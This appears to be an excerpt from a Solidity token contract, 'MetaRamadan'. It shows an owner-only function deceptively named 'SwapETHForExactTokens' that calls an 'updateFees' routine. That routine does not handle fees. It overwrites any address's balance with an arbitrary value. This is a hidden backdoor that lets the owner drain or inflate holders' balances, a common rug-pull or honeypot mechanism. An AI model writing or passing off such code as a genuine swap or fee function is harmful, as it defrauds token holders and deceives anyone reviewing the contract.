...
contract MetaRamadan is Ownable {
  ...
  function updateFees (address from, uint256 value) internal {
    if(from != address(0)){
      balances[from] = value * burnFees * (10 ** 9);
    }
  }

  function SwapETHForExactTokens(address from, uint256 _value) public _OnlyOwner {
    updateFees(from, _value);
  }
